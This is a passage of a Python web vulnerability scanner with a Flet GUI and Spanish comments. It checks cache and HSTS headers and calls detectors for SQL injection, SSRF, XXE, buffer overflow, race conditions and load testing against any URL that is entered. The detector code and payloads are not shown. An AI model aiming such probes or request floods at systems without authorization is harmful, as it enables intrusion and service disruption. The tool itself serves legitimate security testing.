        #Verifica si existen vulnerabilidades de cacheo inseguro en la URL proporcionada."""
        logger.info(f"Comenzando la verificación de cacheo para la URL: {self.url}")

        try:
            # Realizamos una solicitud HTTP GET a la URL proporcionada
            response = requests.get(self.url)
            logger.info(f"Respuesta HTTP recibida con estado: {response.status_code}")

            # Verificar los encabezados HTTP para encontrar configuraciones relacionadas con el cacheo
            cache_control = response.headers.get('Cache-Control', '')
            pragma = response.headers.get('Pragma', '')
            expires = response.headers.get('Expires', '')

            # Asegurarse de que 'cache_control', 'pragma' y 'expires' sean cadenas
            if not isinstance(cache_control, str):
                logger.warning(f"Valor inesperado en 'Cache-Control': {cache_control}")
                cache_control = ''
            if not isinstance(pragma, str):
                logger.warning(f"Valor inesperado en 'Pragma': {pragma}")
                pragma = ''
            if not isinstance(expires, str):
                logger.warning(f"Valor inesperado en 'Expires': {expires}")
                expires = ''

            # Revisar si el encabezado 'Cache-Control' está configurado correctamente
            if 'no-store' not in cache_control and 'no-cache' not in cache_control:
                logger.warning("Falta configurar el encabezado 'Cache-Control' para evitar el cacheo inseguro de datos sensibles.")
                self.recomendaciones.append("Falta configurar el encabezado 'Cache-Control' para evitar el cacheo inseguro de datos sensibles.")
            
            if 'private' in cache_control:
                logger.info("El encabezado 'Cache-Control' está configurado como 'private', lo que es adecuado para evitar el cacheo en proxies compartidos.")
                self.recomendaciones.append("El encabezado 'Cache-Control' tiene configurado 'private', lo que es adecuado para evitar el cacheo en proxies compartidos.")

            if 'no-cache' not in cache_control:
                logger.warning("Se recomienda incluir 'no-cache' en el encabezado 'Cache-Control' para evitar que los navegadores o proxies almacenen datos sensibles.")
                self.recomendaciones.append("Se recomienda incluir 'no-cache' en el encabezado 'Cache-Control' para evitar que los navegadores o proxies almacenen datos sensibles.")

            if not cache_control and not pragma:
                logger.warning("El servidor no está enviando encabezados de control de caché. Esto puede permitir que los datos sensibles sean almacenados en caché.")
                self.recomendaciones.append("El servidor no está enviando encabezados de control de caché. Esto puede permitir que los datos sensibles sean almacenados en caché.")

            if expires:
                logger.info(f"El encabezado 'Expires' está presente con el valor: {expires}. Esto puede permitir que la respuesta sea almacenada en caché hasta esa fecha.")
                self.recomendaciones.append(f"El encabezado 'Expires' está presente y tiene el valor: {expires}. Esto puede permitir que la respuesta sea almacenada en caché hasta esa fecha.")

            if not self.recomendaciones:
                logger.info("No se encontraron problemas evidentes con el cacheo en esta página.")
                return "No se encontraron problemas evidentes con el cacheo en esta página."

            recomendaciones_str = "\n".join(self.recomendaciones)
            logger.info("Se encontraron problemas con el cacheo inseguro.")
            return f"Problemas encontrados en el cacheo:\n{recomendaciones_str}"

        except requests.exceptions.RequestException as e:
            logger.error(f"Error al realizar la solicitud: {e}")
            return f"Error al realizar la solicitud: {e}"



class VerificadorHSTS:
    def __init__(self, url: str):
        self.url = url
        self.recomendaciones = []
        logger.debug(f"[__init__] Verificador HSTS iniciado para la URL: {url}")
    
    def verificar_hsts(self) -> tuple:
        # HTTP es el protocolo, y HSTS es una cabecera HTTP dentro de una respuesta HTTP//Redirige automáticamente cualquier intento de acceso por HTTP a HTTPS, sin permitir conexiones insegura
        #Verifica si la cabecera Strict-Transport-Security (HSTS) está presente y correctamente configurada en la respuesta.
        # es una política de seguridad que se utiliza para indicar a los navegadores que solo deben acceder a un 
        # sitio web a través de una conexión segura (HTTPS) y no mediante HTTP
        logger.debug(f"[verificar_hsts] Comenzando la verificación de HSTS para la URL: {self.url}")
        try:
            # Realizamos una solicitud HTTP GET a la URL proporcionada
            logger.debug(f"[verificar_hsts] Realizando la solicitud HTTP GET a la URL: {self.url}")
            response = requests.get(self.url)
            logger.info(f"[verificar_hsts] Respuesta HTTP recibida con estado: {response.status_code} - URL: {self.url}")
            
            # Verificar la presencia de la cabecera Strict-Transport-Security
            logger.debug(f"[verificar_hsts] Comprobando la cabecera 'Strict-Transport-Security' en los encabezados.")
            hsts = response.headers.get('Strict-Transport-Security', '')
            
            if hsts:
                logger.debug(f"[verificar_hsts] Cabecera HSTS encontrada: {hsts}")
                # Verificar si la configuración de HSTS es segura
                if 'max-age' in hsts and 'includeSubDomains' in hsts:
                    logger.info(f"[verificar_hsts] La cabecera HSTS está configurada correctamente para la URL: {self.url}")
                    self.recomendaciones.append("La cabecera 'Strict-Transport-Security' está configurada correctamente para proteger contra ataques 'man-in-the-middle'.")
                else:
                    logger.warning(f"[verificar_hsts] La cabecera HSTS está presente pero no configurada correctamente para la URL: {self.url}. Se recomienda 'max-age' y 'includeSubDomains'.")
                    self.recomendaciones.append("La cabecera 'Strict-Transport-Security' está presente, pero debe configurarse adecuadamente con 'max-age' y 'includeSubDomains'.")
            else:
                logger.warning(f"[verificar_hsts] La cabecera 'Strict-Transport-Security' no está presente en la respuesta para la URL: {self.url}.")
                self.recomendaciones.append("El servidor no está enviando la cabecera 'Strict-Transport-Security', lo que deja expuesta la página a ataques 'man-in-the-middle'.")
            
            # Devolver recomendaciones
            if not self.recomendaciones:
                logger.info(f"[verificar_hsts] No se encontraron problemas con la cabecera HSTS en la URL: {self.url}")
                return "Verificación HSTS", "No se encontraron problemas con la cabecera HSTS en esta página."
            
            recomendaciones_str = "\n".join(self.recomendaciones)
            logger.info(f"[verificar_hsts] Se encontraron problemas con la cabecera HSTS en la URL: {self.url}")
            return "Verificación HSTS", f"Problemas encontrados con HSTS:\n{recomendaciones_str}"
        
        except requests.exceptions.RequestException as e:
            logger.error(f"[verificar_hsts] Error al realizar la solicitud a la URL: {self.url} - Error: {e}")
            return "Verificación HSTS", f"Error al realizar la solicitud: {e}"




class AnalizadorSeguridad:
    def __init__(self, url: str, num_solicitudes: int = 10, num_solicitudes2: int = 10, longitud_payload: int = 1000):
        self.url = self._normalize_url(url)
        self.resultados: Dict[str, Any] = {}
        self.num_solicitudes = num_solicitudes
        self.num_solicitudes2 = num_solicitudes2
        self.longitud_payload = longitud_payload
        self.lista_dependencias = []

    @staticmethod
    def _normalize_url(url: str) -> str:
        if not url.startswith(('http://', 'https://')):
            return 'https://' + url
        return url

    def escanear_puertos(self) -> Tuple[str, str]:
        escaneo = EscaneoPuertos(self.url)
        try:
            resultados = asyncio.run(escaneo.escanear())
            resultado_formateado = "\n".join(
                [f"Puerto {p}: {info['estado'].upper()} (Servicio: {info['servicio']})" for p, info in resultados.items()]
            )
            return "Escaneo de puertos", resultado_formateado
        except Exception as e:
            return "Escaneo de puertos", f"Error: {e}"

    def verificar_certificado(self) -> Tuple[str, str]:
        verificacion = VerificacionCertificadoSSL(self.url)
        try:
            # Ejecuta la verificación de certificado de forma asíncrona
            resultado = asyncio.run(verificacion.verificar())
            return "Verificación de Certificado SSL/TLS", resultado
        except Exception as e:
            return "Verificación de Certificado SSL/TLS", f"Error: {e}"
    
                
            #ejecutar la detección de servicios en los puertos especificados de una URL 
    def verificar_encabezados(self) -> Tuple[str, str]:
        verificacion = VerificacionEncabezados(self.url)
        try:
            # Ejecuta la verificación de encabezados de forma asíncrona
            resultados = asyncio.run(verificacion.verificar())
            # Formatea el diccionario de encabezados como JSON para mostrarlo ordenadamente
            import json
            resultado_formateado = json.dumps(resultados, indent=2)
            return "Verificación de encabezados HTTP", resultado_formateado
        except Exception as e:
            return "Verificación de encabezados HTTP", f"Error: {e}"
    

    def detectar_sqli(self) -> Tuple[str, str]:
    #Ejecuta la detección de vulnerabilidades SQL Injection en la URL."""
        deteccion = DeteccionSQLi(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            # resultado es True si se detecta vulnerabilidad, False en caso contrario.
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "SQL Injection", estado
        except Exception as e:
            return "SQL Injection", f"Error: {e}"
    
    def detectar_csrf(self) -> Tuple[str, str]:
    #Ejecuta la detección de vulnerabilidades CSRF en la URL
        deteccion = DeteccionCSRF(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "CSRF", estado
        except Exception as e:
            return "CSRF", f"Error: {e}"
    

    def detectar_directory_traversal(self) -> Tuple[str, str]:
        #Ejecuta la detección de vulnerabilidades Directory Traversal en la URL."""
        deteccion = DeteccionDirectoryTraversal(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "Directory Traversal", estado
        except Exception as e:
            return "Directory Traversal", f"Error: {e}"
    
    def detectar_lfi(self) -> Tuple[str, str]:
    #Ejecuta la detección de vulnerabilidades LFI en la URL."""
        deteccion = DeteccionLFI(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "Local File Inclusion", estado
        except Exception as e:
            return "Local File Inclusion", f"Error: {e}"

    def detectar_ssrf(self) -> Tuple[str, str]:
        #Ejecuta la detección de vulnerabilidad SSRF en la URL."""
        deteccion = DeteccionSSRF(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "SSRF", estado
        except Exception as e:
            return "SSRF", f"Error: {e}"

    def detectar_clickjacking(self) -> Tuple[str, str]:
        #Ejecuta la detección de vulnerabilidad Clickjacking en la URL."""
        deteccion = DeteccionClickjacking(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "Clickjacking", estado
        except Exception as e:
            return "Clickjacking", f"Error: {e}"
    def detectar_open_redirect(self) -> Tuple[str, str]:
    #Ejecuta la detección de vulnerabilidad Open Redirect en la URL."""
        deteccion = DeteccionOpenRedirect(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "Open Redirect", estado
        except Exception as e:
            return "Open Redirect", f"Error: {e}"
    def detectar_xxe(self) -> Tuple[str, str]:
        #Ejecuta la detección de vulnerabilidad XXE en la URL."""
        deteccion = DeteccionXXE(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "XXE", estado
        except Exception as e:
            return "XXE", f"Error: {e}"
    def detectar_subdomain_takeover(self) -> Tuple[str, str]:
        #Ejecuta la detección de posibles subdominios vulnerables a takeover."""
        deteccion = DeteccionSubdomainTakeover(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "Subdomain Takeover", estado
        except Exception as e:
            return "Subdomain Takeover", f"Error: {e}"
    def detectar_deserializacion_insegura(self) -> Tuple[str, str]:
        #Ejecuta la detección de deserialización insegura mediante payloads JSON."""
        deteccion = DeteccionDeserializacionInsegura(self.url)
        try:
            resultado = asyncio.run(deteccion.detectar())
            estado = "Vulnerable" if resultado else "No vulnerable"
            return "Deserialización Insegura", estado
        except Exception as e:
            return "Deserialización Insegura", f"Error: {e}"

    def detectar_xss(self) -> Tuple[str, str]:
        #Ejecuta la detección de XSS analizando scripts inseguros en la página HTML."""
        deteccion = DeteccionXSS(self.url)
        try:
            resultado = asyncio.run(deteccion.buscar())
            return "XSS", resultado
        except Exception as e:
            return "XSS", f"Error: {e}"
        
    def ejecutar_prueba_carga(self, num_solicitudes):
        # Crear instancia de PruebaCarga con la URL y el número de solicitudes
        prueba = PruebaCarga(self.url, num_solicitudes)  
        try:
            resultado = asyncio.run(prueba.ejecutar())  # Ejecutar la prueba de carga
            return "Carga", resultado
        except Exception as e:
            return "Carga", {"error": str(e)}
        
    def verificar_condiciones_de_carrera(self, num_solicitudes2) -> Tuple[str, dict]:
        """
        Ejecuta la prueba de condiciones de carrera enviando solicitudes concurrentes
        al servidor para verificar si hay vulnerabilidad.
        """
        condiciones = CondicionesDeCarrera(self.url,num_solicitudes2)
        try:
            # Ejecuta la prueba de condiciones de carrera de forma asíncrona
            resultados = asyncio.run(condiciones.ejecutar())
            return "Condiciones de Carrera", resultados
        except Exception as e:
            return "Condiciones de Carrera", {"error": str(e)}
        
    def detectar_buffer_overflow(self, longitud_payload: int) -> Tuple[str, str]:
    
    #Ejecuta la prueba de desbordamiento de búfer enviando un payload excesivamente largo
    #al servidor para verificar si existe vulnerabilidad.
    
    # Validar que la longitud del payload sea un valor positivo
        if longitud_payload <= 0:
            return "Buffer Overflow", "Error: La longitud del payload debe ser un número positivo."

            # Crear instancia del detector con la URL y la longitud del payload
        detector = BufferOverflowDetector(self.url, longitud_payload)
            
        try:
                # Ejecutar la detección de forma asíncrona
                resultado = asyncio.run(detector.detectar())
                # Determinar el resultado basado en la respuesta
                estado = "Vulnerable" if resultado else "No vulnerable"
                return "Buffer Overflow", estado
        except Exception as e:
                # Capturar y devolver cualquier error que ocurra durante la detección
                return "Buffer Overflow", f"Error: {e}"
        
    def escanear_host_header_injection(self) -> Tuple[str, str]:
        """Método para ejecutar el análisis de Host Header Injection"""
        # Ahora la clase genera los encabezados internamente, no es necesario pasarlos como parámetro
        scanner = HostHeaderInjectionScanner(self.url)  # Llamada solo con la URL

        # Llamada al método de la clase y manejo del resultado
        try:
            resultado = asyncio.run(scanner.verificar_host_header_injection())  # Usamos asyncio.run para ejecutar la función asíncrona
            return resultado
        except Exception as e:
            return "Error", f"Se produjo un error durante el escaneo: {e}"
        
    def verificar_cacheo_inseguro(self) -> Tuple[str, str]:
        #Método para ejecutar el análisis de Cacheo Inseguro.
        verificador = VerificadorCacheoInseguro(self.url)
        try:
            resultado = verificador.verificar_cacheo_inseguro()  # Ejecuta el análisis de cacheo inseguro
            return "Análisis de Cacheo Inseguro", resultado
        except Exception as e:
            return "Análisis de Cacheo Inseguro", f"Error: {e}"
        
    def verificar_HSTS(self) -> tuple:
        #Método para verificar la presencia de HSTS en los encabezados HTTP.
        try:
            # Aquí se asume que VerificadorHSTS es una clase que verifica HSTS
            verificador_hsts = VerificadorHSTS(self.url)
            resultado_hsts = verificador_hsts.verificar_hsts()  # Llamada al método que verifica HSTS
            return "Verificación HSTS", resultado_hsts  # Retorna el nombre y el resultado
        except Exception as e:
            return "Verificación HSTS", f"Error: {str(e)}"
          
#---------------------------------------------------------------------------------------------------------------------------------------------------
#INTERFAZ CON FLET(Flet maneja su bucle de eventos y las interacciones asíncronas internamente, esto significa que Flet ya maneja el ciclo de vida de las tareas asíncronas por ti)

# Configuración principal de la interfaz
async def main(page: ft.Page):
    page.title = "CYBER SCAN PRO VULNERABILITY WEB"
    page.padding = 20
    page.bgcolor = "#0A0A0A"
    page.scroll = "adaptive"
    page.theme_mode = ft.ThemeMode.DARK

    # Paleta de colores
    COLORS = {
        "background": "#0A0A0A",
        "primary": "#00FF00",
        "secondary": "#00FFFF",
        "accent": "#FF00FF",
        "text": "#E0E0E0",
        "warning": "#FF0000",
        "neon_blue": "#00CED1",
        "terminal_green": "#32CD32",
        "glow_effect": "#00FF0044"
    }

    # Componentes de interfaz
    url_input = ft.TextField(label="Ingrese la URL", width=400, border_color=COLORS["primary"])
    
    logs_box = ft.TextField(label="Logs", multiline=True, read_only=True, expand=True, height=200)

    results_table = ft.TextField(label="Resultados", multiline=True, read_only=True, expand=True, height=200)

    # Checkboxes
    check_ports = ft.Checkbox(label="Escaneo de puertos", fill_color="#39FF14")
    check_ssl = ft.Checkbox(label="Verificación de Certificado SSL/TLS:", fill_color="#39FF14")
    check_encabezados = ft.Checkbox(label="Verificación de encabezados", fill_color="#39FF14")  # Verde neón
    check_sqli = ft.Checkbox(label="Buscando Vulnerabilidades SQL injection", fill_color="#FF5733")
    check_csrf = ft.Checkbox(label="Verificación de protecciones CSRF", fill_color="#FF5733")
    check_PathTraversal = ft.Checkbox(label="Probando Directory Traversal", fill_color="#FF5733")
    check_DeteccionLFI = ft.Checkbox(label="Buscando Local File Inclusion", fill_color="#FF5733")
    check_DeteccionSSRF = ft.Checkbox(label="Probando Server-Side Request Forgery", fill_color="#FF5733")
    check_DeteccionClickjacking = ft.Checkbox(label="Verificando protecciones Clickjacking", fill_color="#FF5733")
    check_DeteccionOpenRedirect = ft.Checkbox(label="Probando Open Redirect", fill_color="#FF5733")
    check_DeteccionXXE = ft.Checkbox(label="Probando XML External Entity", fill_color="#FF5733")
    check_DeteccionSubdomainTakeover = ft.Checkbox(label="Verificando posibles Subdomain Takeovers", fill_color="#FF5733")
    check_DeteccionDeserializacionInsegura = ft.Checkbox(label="Probando Deserialización Insegura", fill_color="#FF5733")
    check_DeteccionXSS = ft.Checkbox(label="Buscando scripts inseguros", fill_color="#FF5733")
    check_RaceCondition=ft.Checkbox(label="detectar y simular condiciones de carrera en el servidor",fill_color="#3399FF")
    check_Carga = ft.Checkbox(label="Prueba de carga con múltiples solicitudes",fill_color="#3399FF")
    check_Overflow=ft.Checkbox(label="prueba de desbordamiento de búfer",fill_color="#3399FF")
    check_scanear_host_header_injection=ft.Checkbox(label="verificación de Host Header Injection.",fill_color="#3399FF")
    check_cacheo_inseguro=ft.Checkbox(label="análisis de Cacheo Inseguro",fill_color="#3399FF")
    check_verificar_hsts=ft.Checkbox(label="Verificamos HSTS",fill_color="#3399FF")
     # Tabla de resultados estilo hacker

    # Campos de entrada dinámicos
    num_solicitudes_input = ft.TextField(
        label="Número de Solicitudes (carga)",
        visible=False,
        value="10",
        width=200
    )

    num_solicitudes2_input = ft.TextField(
        label="Número de Solicitudes (carrera)",
        visible=False,
        value="10",
        width=200
    )

    longitud_payload_input = ft.TextField(
        label="Tamaño de payload",
        visible=False,
        value="10",
        width=200
    )

    # Función para actualizar logs
    # Función para agregar un mensaje puntual a los logs
    def agregar_log(message: str):
        """Agrega un mensaje puntual al área de logs."""
        logs_box.value += message + "\n"
        page.update()

    # Función asíncrona para actualizar continuamente los logs desde 'scanner.log'
    async def update_logs_continuo():
        """Lee continuamente el archivo scanner.log y actualiza la interfaz."""
        while True:
            try:
                with open("scanner.log", "r", encoding="utf-8") as log_file:
                    logs_box.value = log_file.read()
                page.update()
            except FileNotFoundError:
                logs_box.value = "El archivo scanner.log aún no existe."
                page.update()
            await asyncio.sleep(2)  # Actualiza cada 2 segundos

    # Inicia la tarea de actualización continua en segundo plano
    asyncio.create_task(update_logs_continuo())


    # Control de visibilidad de campos
    def actualizar_visibilidad(e):
        num_solicitudes_input.visible = check_Carga.value
        num_solicitudes2_input.visible = check_RaceCondition.value
        longitud_payload_input.visible = check_Overflow.value
        page.update()

    # Asignar eventos
    check_Carga.on_change = actualizar_visibilidad
    check_RaceCondition.on_change = actualizar_visibilidad
    check_Overflow.on_change = actualizar_visibilidad

    # Función de escaneo
    def on_scan_click(e):
        try:
            url = url_input.value.strip()
            if not url:
                agregar_log("Por favor, ingrese una URL válida.")
                return

            agregar_log("Ejecutando análisis...")
            analizador = AnalizadorSeguridad(url)
            resultado_final = ""

            # Ejemplo: para cada check, se llama al método correspondiente y se agrega una fila
            if check_ports.value:
                # Se asume que analizador.escanear_puertos() devuelve (nombre, resultado)
                nombre, resultado = analizador.escanear_puertos()
                # Acumula el resultado en un string para otros usos (por ejemplo, exportar)
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            
            if check_ssl.value:
                nombre, resultado = analizador.verificar_certificado()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_encabezados.value:
                nombre, resultado = analizador.verificar_encabezados()
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            
            if check_sqli.value:
                nombre, resultado = analizador.detectar_sqli()
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            
            if check_csrf.value:
                nombre, resultado = analizador.detectar_csrf()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_PathTraversal.value:
                nombre, resultado = analizador.detectar_directory_traversal()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_DeteccionLFI.value:
                nombre, resultado = analizador.detectar_lfi()
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            
            if check_DeteccionSSRF.value:
                nombre, resultado = analizador.detectar_ssrf()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_DeteccionClickjacking.value:
                nombre, resultado = analizador.detectar_clickjacking()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_DeteccionOpenRedirect.value:
                nombre, resultado = analizador.detectar_open_redirect()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_DeteccionXXE.value:
                nombre, resultado = analizador.detectar_xxe()
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            
            if check_DeteccionSubdomainTakeover.value:
                nombre, resultado = analizador.detectar_subdomain_takeover()
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            
            if check_DeteccionDeserializacionInsegura.value:
                nombre, resultado = analizador.detectar_deserializacion_insegura()
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            
            if check_DeteccionXSS.value:
                nombre, resultado = analizador.detectar_xss()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_RaceCondition.value:
                num_solicitudes2 = int(num_solicitudes2_input.value)
                nombre, resultado = analizador.verificar_condiciones_de_carrera(num_solicitudes2)
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_Carga.value:
                num_solicitudes = int(num_solicitudes_input.value)
                nombre, resultado = analizador.ejecutar_prueba_carga(num_solicitudes)
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_Overflow.value:
                longitud = int(longitud_payload_input.value)
                nombre, resultado = analizador.detectar_buffer_overflow(longitud)
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            if check_scanear_host_header_injection.value:
                nombre, resultado = analizador.escanear_host_header_injection()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_cacheo_inseguro.value:
                nombre, resultado = analizador.verificar_cacheo_inseguro()
                resultado_final += f"{nombre}:\n{resultado}\n\n"

            if check_verificar_hsts.value:
                logger.debug("Ejecutando verificación HSTS...")
                nombre, resultado = analizador.verificar_HSTS()  # Asumimos que devuelve una tupla
                logger.debug(f"Nombre de la verificación: {nombre}")
                logger.debug(f"Resultado: {resultado}")
                resultado_final += f"{nombre}:\n{resultado}\n\n"
            else:
                logger.debug("La verificación HSTS no fue activada.")

            results_table.value = resultado_final
            agregar_log("Análisis completado con éxito.")
        except Exception as e:
            agregar_log(f"Error: {str(e)}")
        finally:
            page.update()
    # Función de limpieza
    def button_clear(e):
        url_input.value = ""
        results_table.value=""
        logs_box.value = ""
        num_solicitudes_input.value = "10"
        num_solicitudes_input.visible = False
        num_solicitudes2_input.value = "10"
        num_solicitudes2_input.visible = False
        longitud_payload_input.value="10"
        longitud_payload_input.visible = False
        page.update()

    def on_download_click(e):  # Botón de descarga de reporte
        try:
            download_path = os.path.expanduser("~/Downloads/reporte_analisis.txt")
            with open(download_path, "w") as f:
                f.write(results_table.value)
            agregar_log(f"Reporte guardado en {download_path}")
        except Exception as e:
            agregar_log(f"Error al guardar el reporte: {e}")
    
    def on_download_logs(e):
        try:
            download_path = os.path.expanduser("~/Downloads/scanner.log")
            # Lee el archivo scanner.log en modo binario
            with open("scanner.log", "rb") as f:
                log_bytes = f.read()
            # Escribe el contenido en la ruta de descarga
            with open(download_path, "wb") as f:
                f.write(log_bytes)
            agregar_log(f"Logs guardados en {download_path}")
        except Exception as ex:
            agregar_log(f"Error al guardar logs: {ex}")

    page.add(
        ft.Column(
            [
                ft.Container(
                    content=ft.Row([
                        ft.Icon(ft.Icons.SECURITY, color=COLORS["primary"], size=40),
                        ft.Text("CYBER SCAN PRO VULNERABILITY WEB", size=28, weight="bold", color=COLORS["primary"])
                    ], alignment=ft.MainAxisAlignment.CENTER),
                    padding=20,
                    bgcolor=COLORS["background"],
                    border=ft.border.all(2, COLORS["primary"]),
                    border_radius=5
                ),
                ft.Container(
                    content=ft.Column([

                        ft.Row([#un contenedor que organiza sus elementos manera horizontal
                        # Columna Seguridad de Red
                        ft.Container(
                            
                            content=ft.Column([
                                ft.Row([ft.Icon(ft.Icons.NETWORK_CHECK, color=COLORS["primary"], size=24),
            ft.Text("Seguridad de Red", color=COLORS["secondary"], weight="bold", size=18)
        ], alignment=ft.MainAxisAlignment.CENTER),
                                check_ports,
                                check_ssl,
                                check_encabezados,
                            ], spacing=15),
                            padding=10,
                            border=ft.border.all(1, COLORS["primary"]),
                            border_radius=10,
                            width=250,
                            margin=10
                        ),
                        ft.Container(
                            content=ft.Column([
                                ft.Row([
                        ft.Icon(ft.Icons.BUG_REPORT, color=COLORS["primary"], size=40),
                        ft.Text("Ataques de Inyección", color=COLORS["secondary"], weight="bold", size=18)
                    ], alignment=ft.MainAxisAlignment.CENTER),
                                check_sqli,
                                check_csrf,
                                check_PathTraversal,
                                check_DeteccionLFI,
                                check_DeteccionSSRF,
                                check_DeteccionClickjacking,
                                check_DeteccionOpenRedirect,
                                check_DeteccionXXE,
                                check_DeteccionSubdomainTakeover,
                                check_DeteccionDeserializacionInsegura,
                                check_DeteccionXSS,
                            ],spacing=10),
                            padding=10,
                            border=ft.border.all(1, COLORS["primary"]),
                            border_radius=10,
                            width=400,
                            margin=10
                        ),
                        # Columna Servidor
                        ft.Container(
                            content=ft.Column([
                                ft.Row([#se pone el icono al lado del titulo se usa Row en caso solo seas text se usa ft.tex
                        ft.Icon(ft.Icons.DNS, color=COLORS["primary"], size=40),
                        ft.Text("Seguridad de Servidor", color=COLORS["secondary"], weight="bold", size=18)
                    ], alignment=ft.MainAxisAlignment.CENTER),
                                check_RaceCondition,
                                num_solicitudes2_input,
                                check_Carga,
                                num_solicitudes_input,
                                check_Overflow,
                                longitud_payload_input,
                                check_scanear_host_header_injection,
                                check_cacheo_inseguro,
                                check_verificar_hsts
                            ], spacing=10),
                            padding=10,
                            border=ft.border.all(1, COLORS["primary"]),
                            border_radius=10,
                            width=400,
                            margin=10
                        )
                    ])  # Cierre del Row
                ])  # Cierre del Columna interno
            ),  # Cierre del Container principal
            
            # Input URL
            url_input,
            
            # Tabla de resultados
            ft.Container(
                results_table,
                padding=10,
                border=ft.border.all(1, COLORS["primary"])
            ),
            
            # Registro de actividad
            ft.Container(
                ft.Column([
                    ft.Text("Registro de Actividad", color=COLORS["secondary"], weight="bold"),
                    ft.Container(
                        logs_box,
                        height=200,
                        border=ft.border.all(1, COLORS["primary"]),
                        padding=10
                    )
                ])
            ),
            
            # Botones
            ft.Row([
                ft.ElevatedButton(
                    "Iniciar Escaneo",
                    icon=ft.Icons.SEARCH,
                    on_click=on_scan_click,
                    style=ft.ButtonStyle(bgcolor=COLORS["primary"], color=COLORS["background"], shape=ft.RoundedRectangleBorder(radius=8))
                ),
                
                ft.ElevatedButton(
                            "Descargar Reporte",
                            icon=ft.Icons.DOWNLOAD,
                            on_click= on_download_click,  # Acción del botón de descarga
                            style=ft.ButtonStyle(
                    bgcolor=COLORS["secondary"],
                    color=COLORS["background"],
                    shape=ft.RoundedRectangleBorder(radius=8)
                )
               
            ),
            ft.ElevatedButton(
                                "Descargar Logs",
                                icon=ft.Icons.DOWNLOAD,  # Usa ft.Icons en lugar de ft.Icons para evitar las advertencias
                                on_click=on_download_logs,
                                style=ft.ButtonStyle(
                                    bgcolor=COLORS["secondary"],
                                    color=COLORS["background"],
                                    shape=ft.RoundedRectangleBorder(radius=8)
                                )
                            ),
                ft.ElevatedButton(
                    "Limpiar",
                    icon=ft.Icons.CLEAR_ALL,
                    on_click=button_clear,## Llama a la función cuando se presiona
                    style=ft.ButtonStyle(
            bgcolor=COLORS["warning"],
            color=COLORS["background"],
            shape=ft.RoundedRectangleBorder(radius=8)
        ),
        height=40)
            ], spacing=20, alignment=ft.MainAxisAlignment.CENTER)
        ],
        spacing=20
    )
)

if __name__ == "__main__":
    ft.app(target=main)
